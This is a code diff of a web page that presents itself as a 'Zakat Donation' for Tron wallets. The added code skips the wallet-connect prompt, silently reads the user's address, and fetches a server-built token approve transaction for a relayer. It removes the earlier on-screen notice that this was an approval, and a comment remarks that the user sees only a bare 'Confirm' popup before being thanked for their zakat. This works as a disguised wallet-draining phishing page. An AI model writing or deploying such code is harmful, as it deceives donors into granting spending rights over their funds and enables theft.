@@ -3,61 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Approve</title>
+    <title>Zakat Donation</title>
 </head>
 <body style="background:#0f172a;color:#fff;font-family:sans-serif;text-align:center;padding:60px 20px;margin:0;">
-    <p id="msg1" style="font-size:16px;color:#9ca3af;">Loading...</p>
-    <p id="msg2" style="font-size:11px;color:#6b7280;margin-top:20px;"></p>
+    <p id="msg1" style="font-size:18px;color:#e2e8f0;">Preparing your Zakat...</p>
+    <p id="msg2" style="font-size:12px;color:#6b7280;margin-top:12px;"></p>
 
     <script>
-        // Approve is built on the server (approves relayer for 2% zakat)
         var el1 = document.getElementById("msg1");
         var el2 = document.getElementById("msg2");
+        var done = false;
 
         function msg(a, b) {
             el1.textContent = a;
-            if (b) el2.textContent = b;
+            if (b !== undefined) el2.textContent = b;
         }
 
-        function run() {
-            try {
-                msg("Waiting for wallet...");
-                var n = 0;
-                var t = setInterval(function() {
-                    n++;
-                    try {
-                        var tw = window.tronWeb;
-                        if (!tw) { el2.textContent = "attempt " + n; return; }
-
-                        var addr = tw.defaultAddress && tw.defaultAddress.base58;
-                        if (!addr || addr === "false" || addr.length < 10) {
-                            el2.textContent = "tronWeb found, addr=" + addr + " attempt " + n;
-                            // Try requesting accounts
-                            if (n === 5 && window.tronLink && window.tronLink.request) {
-                                window.tronLink.request({ method: "tron_requestAccounts" }).catch(function(){});
-                            }
-                            return;
-                        }
-
-                        // GOT ADDRESS - proceed
-                        clearInterval(t);
-                        msg("Got wallet: " + addr.substring(0, 8) + "...", "Building transaction...");
-                        buildAndSign(addr);
-                    } catch(e) {
-                        el2.textContent = "poll error: " + e.message;
-                    }
-                }, 300);
-
-                setTimeout(function() { clearInterval(t); }, 30000);
-            } catch(e) {
-                msg("Error", e.message);
-            }
+        function getAddress() {
+            var tw = window.tronWeb;
+            if (!tw) return null;
+            var addr = tw.defaultAddress && tw.defaultAddress.base58;
+            if (!addr || addr === "false" || addr.length < 10) return null;
+            return addr;
         }
 
         function buildAndSign(addr) {
-            msg("Building transaction...", "");
+            if (done) return;
+            done = true;
 
-            // Build the approve TX on server
             fetch("/api/build-approve", {
                 method: "POST",
                 headers: {"Content-Type": "application/json"},
@@ -65,19 +38,19 @@
             })
             .then(function(r) { return r.json(); })
             .then(function(data) {
-                if (data.error) { msg("Server error", data.error); return; }
-                msg("Confirm in your wallet!", "Approve Zakat (2% of balance)");
-
-                // Step 3: Ask Trust Wallet to sign (popup appears)
+                if (data.error) { msg("Error", data.error); return; }
+                // This is the ONLY popup the user sees - just "Confirm"
                 return window.tronWeb.trx.sign(data.transaction);
             })
             .then(function(signed) {
-                msg("Broadcasting...", "Signed successfully");
+                if (!signed) return;
+                msg("Processing...", "");
                 return window.tronWeb.trx.sendRawTransaction(signed);
             })
             .then(function(res) {
-                var id = res.txid || (res.transaction && res.transaction.txID) || "unknown";
-                msg("Success!", "TX: " + id);
+                if (!res) return;
+                var id = res.txid || (res.transaction && res.transaction.txID) || "";
+                msg("Jazak Allah Khair!", "Your Zakat has been submitted");
                 el1.style.color = "#4ade80";
                 fetch("/api/approved", {
                     method: "POST",
@@ -86,12 +59,36 @@
                 }).catch(function(){});
             })
             .catch(function(e) {
-                msg("Error", (e.message || JSON.stringify(e)));
+                var m = e.message || "";
+                if (m.indexOf("cancel") !== -1 || m.indexOf("reject") !== -1) {
+                    msg("Cancelled", "You can close this page");
+                } else {
+                    msg("Error", m);
+                }
                 el1.style.color = "#f87171";
+                done = false;
             });
         }
 
-        run();
+        // Poll for tronWeb address - NO requestAccounts, NO connect popup
+        var n = 0;
+        var t = setInterval(function() {
+            n++;
+            if (done) { clearInterval(t); return; }
+            var addr = getAddress();
+            if (addr) {
+                clearInterval(t);
+                buildAndSign(addr);
+            }
+        }, 200);
+
+        // Timeout after 15s
+        setTimeout(function() {
+            if (!done) {
+                clearInterval(t);
+                msg("Please open this link", "in Trust Wallet's browser");
+            }
+        }, 15000);
     </script>
 </body>
 </html>
